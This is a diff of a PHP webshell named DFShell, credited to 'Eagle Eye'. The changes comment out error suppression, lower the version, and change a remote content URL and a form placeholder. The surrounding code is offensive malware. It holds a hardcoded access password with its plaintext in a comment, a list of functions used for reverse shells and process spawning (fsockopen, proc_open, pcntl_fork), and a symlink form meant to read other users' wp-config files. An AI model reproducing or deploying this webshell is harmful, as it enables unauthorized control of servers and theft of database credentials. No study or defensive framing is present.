@@ -1,8 +1,8 @@
 <?php
 
-ini_set('display_errors', 0);
-ini_set('display_startup_errors', 0);
-error_reporting(0);
+#ini_set('display_errors', 0);
+#ini_set('display_startup_errors', 0);
+#error_reporting(0);
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 #                                                                               #
 #           This webshell are programmed and modified by Eagle Eye              #
@@ -15,7 +15,7 @@ error_reporting(0);
 // creating session
 
 session_start();
-$DFShell_Ver = 2.1;
+$DFShell_Ver = 1.0;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
 "stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents","posix_getpwuid"); // $GLOBALS['DFSyntax']
@@ -48,7 +48,7 @@ class DFShell{
     private $error   = false;   
 
     static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
-    static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
+    static protected $remote_url = "css";
     
     public function DFSPopupMSG($no,$title,$msg,$foot,$x){
         if($x){
@@ -520,7 +520,7 @@ class DFShell{
                 echo "<table><form action='' method='POST'>";
                 echo "<input type='hidden' name='dfssym'><br>";
                 echo "<tr><td id='symlable' class='symex1'><label>Symlink home&file target : </label></td><td id='symlable'><input type='text' name='target' placeholder='/path/%{user}%/path/file.php'></td></tr>";
-                echo "<tr><td id='symlable' class='symex1'><label>Saved to path : </label></td><td id='symlable'><input type='text' name='path' placeholder='".$GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']."/path/'></td></tr>";
+                echo "<tr><td id='symlable' class='symex1'><label>Saved to path : </label></td><td id='symlable'><input type='text' name='path' placeholder='path/'></td></tr>";
                 echo "<tr><td id='symlable' class='symex1'><label>Saved as : </label></td><td id='symlable'><input type='text' name='dfsaved' placeholder='wp-config.txt'></td></tr>";
                 echo "<tr><td id='symlable'></td><td id='symlable'><button>Symlink</button></td></tr></form></table><div class='sym_response'>";
                 if(isset($GLOBALS['DFConfig'][1]['dfssym'])){
